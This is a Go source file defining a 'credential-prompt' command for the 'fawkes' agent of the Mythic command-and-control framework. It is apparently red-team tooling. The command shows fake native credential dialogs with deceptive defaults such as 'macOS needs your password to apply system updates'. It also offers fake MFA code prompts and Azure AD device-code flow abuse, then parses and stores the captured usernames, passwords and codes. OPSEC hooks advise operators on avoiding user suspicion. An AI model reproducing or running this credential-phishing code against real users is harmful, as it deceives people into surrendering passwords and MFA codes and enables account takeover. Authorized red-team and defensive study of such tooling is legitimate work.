package agentfunctions

import (
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func parseCredentialPromptResponse(responseText string) (username, credential, credType string) {
	for _, line := range strings.Split(responseText, "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "User:") {
			username = strings.TrimSpace(strings.TrimPrefix(trimmed, "User:"))
		} else if strings.HasPrefix(trimmed, "Password:") {
			credential = strings.TrimSpace(strings.TrimPrefix(trimmed, "Password:"))
			credType = "dialog"
		} else if strings.HasPrefix(trimmed, "Code:") {
			credential = strings.TrimSpace(strings.TrimPrefix(trimmed, "Code:"))
			credType = "mfa-phish"
		}
	}
	return
}

func credentialPromptDefaultTitle(title string) string {
	if title == "" {
		return "Update Required"
	}
	return title
}

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "credential-prompt",
		Description:         "Display a native credential dialog or initiate OAuth device code flow for MFA abuse. macOS: AppleScript. Windows: CredUI. Linux: zenity. Cross-platform: device-code flow.",
		HelpString:          "credential-prompt [-action dialog|device-code] [-title \"Authentication Required\"] [-message \"Enter your credentials...\"] [-icon caution] [-tenant_id <id>] [-client_id <id>]",
		Version:             3,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "credential_prompt_new.js"),
			Author:     "@galoryber",
		},
		MitreAttackMappings: []string{"T1056.002", "T1621", "T1111"}, // Input Capture, MFA Request Generation, MFA Interception
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_MACOS, agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"dialog", "device-code", "mfa-phish"},
				Description:      "Action: dialog (native credential prompt), device-code (OAuth MFA abuse via Azure AD device code flow), or mfa-phish (fake MFA verification code dialog)",
				DefaultValue:     "dialog",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "title",
				ModalDisplayName: "Dialog Title",
				CLIName:          "title",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Title bar text for the dialog. Default: Update Required",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "message",
				ModalDisplayName: "Dialog Message",
				CLIName:          "message",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Body text displayed in the dialog. Default: macOS needs your password to apply system updates.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "icon",
				ModalDisplayName: "Icon",
				CLIName:          "icon",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"caution", "note", "stop"},
				Description:      "Dialog icon: caution (warning triangle), note (info), or stop (critical)",
				DefaultValue:     "caution",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "tenant_id",
				ModalDisplayName: "Azure Tenant ID",
				CLIName:          "tenant_id",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Azure AD tenant ID for device-code flow (default: organizations for multi-tenant)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "client_id",
				ModalDisplayName: "OAuth Client ID",
				CLIName:          "client_id",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "OAuth client ID for device-code flow (default: Microsoft Office first-party app)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			title, _ := taskData.Args.GetStringArg("title")
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: Credential prompt dialog (\"%s\"). Displays a Windows credential dialog to the user. If the user is suspicious or reports it, the operation may be compromised. The dialog appears from the agent process context, which may look unusual.", title),
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: Credential prompt dialog was displayed. If the user entered credentials, they are captured. If the user dismissed the dialog or became suspicious, they may report the incident. Monitor for user-initiated security reports or help desk tickets about unexpected auth prompts.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			title, _ := taskData.Args.GetStringArg("title")
			title = credentialPromptDefaultTitle(title)
			display := fmt.Sprintf("title: %s", title)
			response.DisplayParams = &display
			createArtifact(taskData.Task.ID, "User Interaction", fmt.Sprintf("GUI credential prompt: %s", title))
			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			username, credential, credType := parseCredentialPromptResponse(responseText)
			if username != "" && credential != "" {
				comment := "credential-prompt dialog capture"
				realm := "local"
				if credType == "mfa-phish" {
					comment = "credential-prompt mfa-phish capture"
					realm = "mfa-phish"
				}
				registerCredentials(processResponse.TaskData.Task.ID, []mythicrpc.MythicRPCCredentialCreateCredentialData{
					{
						CredentialType: "plaintext",
						Realm:          realm,
						Account:        username,
						Credential:     credential,
						Comment:        comment,
					},
				})
			}
			return response
		},
	})
}
